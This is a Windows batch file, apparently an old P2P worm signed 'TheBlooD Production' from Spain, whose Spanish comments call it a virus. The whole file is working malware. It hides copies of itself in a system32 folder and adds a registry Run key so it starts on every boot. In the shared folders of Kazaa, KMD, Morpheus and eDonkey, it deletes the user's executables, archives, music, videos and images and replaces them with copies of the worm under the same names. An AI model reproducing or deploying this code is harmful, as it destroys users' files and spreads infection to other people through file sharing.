   @echo off
   if exist c:\windows\system32\garbaje\blood.exe goto blood
   md c:\windows\system32\garbaje
   echo BLOOD>c:\windows\system32\garbaje\blood.txt

   ::Modificación del registro.

   ECHO REGEDIT4>c:\blood.reg
   ECHO.>>c:\blood.reg
   ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>c:\blood.reg
   ECHO "BLOOD"="c:\\windows\\system32\\garbaje\\blood.exe">>c:\blood.reg
   @REGEDIT /S /C c:\blood.reg
   del c:\blood.reg

   ::Copia del virus

   for %%a in (c:\windows\system32\garbaje\*.txt) do copy %0 c:\windows\system32\garbaje\blood.bat
   del c:\windows\system32\garbaje\blood.txt
   cd>>c:\windows\system32\garbaje\dir.txt
   echo @echo off>c:\windows\system32\garbaje\copiar.bat
   for /F "delims=," %%b in (dir.txt) do echo cd %%b>>c:\windows\system32\garbaje\copiar.bat
   echo pause>>c:\windows\system32\garbaje\copiar.bat
   echo copy _*.exe c:\windows\system32\garbaje>>c:\windows\system32\garbaje\copiar.bat
   echo cd c:\windows\system32\garbaje>>c:\windows\system32\garbaje\copiar.bat
   echo ren _*.exe blood.exe>>c:\windows\system32\garbaje\copiar.bat
   echo exit>>c:\windows\system32\garbaje\copiar.bat
   start c:\windows\system32\garbaje\copiar.bat
   goto fin
   :blood

   ::Expansion por redes P2P

   md c:\p2p


   :: Kazaa

   cd c:\p2p
   cd %ProgramFiles%\Kazaa\My Shared Folder
   del _*.*
   dir/b/a-d *.exe *.zip *.rar>>kazaa.txt
   del *.exe *.zip *.rar
   for /F %%b in (kazaa.txt) do copy c:\windows\system32\garbaje\blood.exe _%%b
   dir/b/a-d *.mp3 *.wav *.avi *.mpeg *.jpg>>kazaa2.txt
   del *.mp3 *.wav *.avi *.mpeg *.jpg
   for /F %%b in (kazaa2.txt) do copy c:\windows\system32\garbaje\blood.exe %%b
   attrib +s +h kazaa.txt
   del kazaa2.txt

   :: Kazaa Media Desktop

   cd c:\p2p
   cd %ProgramFiles%\KMD\My Shared Folder
   del _*.*
   dir/b/a-d *.exe *.zip *.rar>>KMD.txt
   del *.exe *.zip *.rar
   for /F %%b in (KMD.txt) do copy c:\windows\system32\garbaje\blood.exe _%%b
   dir/b/a-d *.mp3 *.wav *.avi *.mpeg *.jpg>>KMD2.txt
   del *.mp3 *.wav *.avi *.mpeg *.jpg
   for /F %%b in (KMD2.txt) do copy c:\windows\system32\garbaje\blood.exe %%b
   attrib +s +h KMD.txt
   del KMD2.txt

   ::Morpheus

   cd c:\p2p
   cd %ProgramFiles%\Morpheus\My Shared Folder
   del _*.*
   dir/b/a-d *.exe *.zip *.rar>>morpheus.txt
   del *.exe *.zip *.rar
   for /F %%b in (morpheus.txt) do copy c:\windows\system32\garbaje\blood.exe _%%b
   dir/b/a-d *.mp3 *.wav *.avi *.mpeg *.jpg>>morpheus2.txt
   del *.mp3 *.wav *.avi *.mpeg *.jpg
   for /F %%b in (morpheus2.txt) do copy c:\windows\system32\garbaje\blood.exe %%b
   attrib +s +h morpheus.txt
   del morpheus2.txt

   ::Edonkey

   cd c:\p2p
   cd %ProgramFiles%\Edonkey2000\Incoming
   del _*.*
   dir/b/a-d *.exe *.zip *.rar>>edonkey.txt
   del *.exe *.zip *.rar
   for /F %%b in (edonkey.txt) do copy c:\windows\system32\garbaje\blood.exe _%%b
   dir/b/a-d *.mp3 *.wav *.avi *.mpeg *.jpg>>edonkey2.txt
   del *.mp3 *.wav *.avi *.mpeg *.jpg
   for /F %%b in (edonkey2.txt) do copy c:\windows\system32\garbaje\blood.exe %%b
   attrib +s +h edonkey.txt
   del edonkey2.txt
   :fin
   cd c:\
   rmdir/s/q c:\p2p
   del archivos
   cls
   ::##################################
   ::#     TheBlooD  Production ©     #
   ::#             Spain              #
   ::##################################
